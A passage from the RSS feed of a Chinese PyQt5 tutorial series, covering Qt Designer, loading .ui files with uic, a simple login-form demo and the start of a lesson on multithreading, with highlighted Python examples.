class="line-number"></div><div class="line-number"></div></div></div><p>效果：</p>
<p></p>
<h2>四、作业</h2>
<p>左边的控件是 <code>QDial</code>   ， 右边的控件是 <code>QSpinBox</code> 。两者相互关联，转动刻度右边的数字随之改变，改变右边的数字，左边的刻度盘也跟着转到指定位置。</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>007-QtDesigner</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/007-QtDesigner.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/007-QtDesigner.html</guid>
      <source url="https://www.geekery.cn/rss.xml">007-QtDesigner</source>
      <description>007-QtDesigner 一、介绍 纯靠代码来编写界面，效率属实是有点底，今天我们用另外一个辅助设计图形化的软件 QT Designer 1. 下载 Mac版本：https://www.qt.io/ Windows版本：https://www.qt.io/ 2. 安装&amp;运行 安装过程很简单，按照正常软件安装即可，安装后的图片如下图： image-2...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一、介绍</h2>
<p>纯靠代码来编写界面，效率属实是有点底，今天我们用另外一个辅助设计图形化的软件 <code>QT Designer</code></p>
<h3>1. 下载</h3>
<p>Mac版本：<a href="https://www.qt.io/" target="_blank" rel="noopener noreferrer">https://www.qt.io/</a></p>
<p>Windows版本：<a href="https://www.qt.io/" target="_blank" rel="noopener noreferrer">https://www.qt.io/</a></p>
<h3>2. 安装&amp;运行</h3>
<p>安装过程很简单，按照正常软件安装即可，安装后的图片如下图：</p>
<p></p>
<p><strong>但Mac平台用户要注意，运行时会出现如下图问题</strong>：</p>
<p></p>
<p><strong>解决办法</strong>：在“应用程序”文件夹，按住<code>control</code>键然后运行。只需要这种方式运行第一次即可，以后运行就像普通软件一样打开</p>
<p></p>
<h2>二、使用QT Designer</h2>
<p>Mac运行之后的效果如下：</p>
<p></p>
<p>Windows基本也是如此，只是效果略有不同</p>
<h2>三、使用流程</h2>
<p>1.创建一个基于QWidget的界面</p>
<p></p>
<p>2.此时会创建一个新的窗口，如下效果</p>
<p></p>
<p>3.拖动想要的控件</p>
<p></p>
<p>4.选中控件，看属性</p>
<p></p>
<p>5.修改属性</p>
<p></p>
<p>6.如果没有看到preperty等窗口怎么办？看下图</p>
<p></p>
<p>7.信号与槽（没有没有看到Singal/Slot Editor请按照上一步操作进行显示）</p>
<p></p>
<p>8.预览效果</p>
<p></p>
<p></p>
<p>9.保存</p>
<p></p>
<p>我起名叫<code>tset.ui</code>保存后的效果如下：</p>
<p></p>
<p>10.python代码使用<code>test.ui</code>文件</p>
<p>若要加载ui文件，则需要导入 <code>uic</code> 模块 , 它位于<code>PyQt5</code> 中</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"""</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">动态加载ui文件</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"""</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5 </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    ui </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">loadUi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"./test.ui"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    ui.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将<code>test.ui</code>与上述代码文件放到同一个路径下，运行次<code>.py</code>文件后的效果 如下：</p>
<p></p>
<h2>四、练习</h2>
<p>请使用QT Designer设计如下效果</p>
<p></p>
<h2>五、进阶使用案例</h2>
<p>目的：获取用户名、密码，在TextBrowser中显示一些登录的信息</p>
<p>用到的技术：python加载<code>.ui</code>文件获取了界面，对<code>.ui</code>文件中的控件操作，完成信号与槽的绑定等</p>
<p>1.看看<code>.ui</code>文件有什么属性，如下图</p>
<p></p>
<p>在这里，我们看到加载后的<code>.ui</code>文件有7个对象属性，正好与在设计<code>.ui</code>文件时控件的数量一致，可见属性的个数正好对应<code>.ui</code>文件中的空间个数，所以想要操作哪个空间，就通过<code>对象.属性</code>的方式从<code>.ui</code>对象中提取即可。当然了不能盲目的提取，这些属性的名字其实就是在<code>.ui</code>文件中的空间的<code>Object name</code>，如下图</p>
<p></p>
<p>2.编写代码如下：</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5 </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">loadUi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"./login.ui"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # print(self.ui.__dict__)  # 查看ui文件中有哪些控件</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 提取要操作的控件</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.user_name_qwidget </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.lineEdit  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 用户名输入框</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.password_qwidget </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.lineEdit_2  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 密码输入框</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.login_btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.pushButton  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 登录按钮</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.forget_password_btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.pushButton_2  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 忘记密码按钮</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.textBrowser  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 文本显示区域</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 绑定信号与槽函数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.login_btn.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.login)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> login</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        """登录按钮的槽函数"""</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        user_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.user_name_qwidget.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        password </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.password_qwidget.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "admin"</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> and</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> password </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "123456"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"欢迎</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user_name)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">repaint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"用户名或密码错误....请重试"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">repaint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.ui.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果如下：</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>008-PyQt多线程</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/008-PyQt%E5%A4%9A%E7%BA%BF%E7%A8%8B.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/008-PyQt%E5%A4%9A%E7%BA%BF%E7%A8%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">008-PyQt多线程</source>
      <description>008-PyQt多线程 1. 引入 将上一节课讲解的最后一个FeiQQ登录的按钮，适当修改代码，详细如下 重新运行效果如下： Nov-23-2020 22-54-14 可以很明显的看到，程序是卡顿的 why？为什么会卡顿呢？大名鼎鼎的Qt不止于此吧！ 答：只要是带界面的程序，一般来说程序运行后会用当前线程进行事件的检查、按钮等图形界面的更新操作，如果在...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>1. 引入</h2>
<p>将上一节课讲解的最后一个FeiQQ登录的按钮，适当修改代码，详细如下</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> time</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5 </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">loadUi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"./login.ui"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # print(self.ui.__dict__)  # 查看ui文件中有哪些控件</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 提取要操作的控件</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.user_name_qwidget </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.lineEdit  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 用户名输入框</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.password_qwidget </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.lineEdit_2  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 密码输入框</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.login_btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.pushButton  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 登录按钮</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.forget_password_btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.pushButton_2  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 忘记密码按钮</span></span>
